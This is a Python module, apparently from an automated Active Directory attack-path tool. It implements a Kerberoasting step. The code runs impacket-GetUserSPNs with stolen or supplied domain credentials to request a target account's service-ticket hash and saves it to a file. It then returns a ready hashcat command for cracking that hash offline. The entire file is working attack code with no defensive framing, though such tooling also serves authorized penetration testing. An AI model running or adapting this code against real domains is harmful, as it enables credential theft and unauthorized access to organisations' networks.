# strategies/kerberoast.py
import subprocess
from dataclasses import dataclass
from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from exceptions.hop_failed_error import HopFailedError
from references.cred_store import enrich_creds

@dataclass
class KerberoastStrategy(ExploitStrategy):
    edge: Edge

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.KERBEROASTABLE

    def exploit(self, creds: dict) -> ExploitResult:
        creds = {**creds, "username": self.attacker.sam()}
        creds = enrich_creds(creds)
        target_sam = self.target.sam()
        output_file = f"tmp/{target_sam}.hash"

        cmd = [
            "impacket-GetUserSPNs",
            f"{creds['domain']}/{creds['username']}",
            "-dc-ip", creds["dc_ip"],
            "-request-user", target_sam,
            "-outputfile", output_file,
            "-hashes", creds.get("secret", ""),
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if proc.returncode != 0:
            raise HopFailedError(self.edge, proc.stderr)

        return ExploitResult(
            technique="Kerberoast",
            edge=self.edge,
            success=True,
            notes=f"Hash saved to {output_file}",
            next_command=f"hashcat -m 13100 {output_file} wordlist.txt",
        )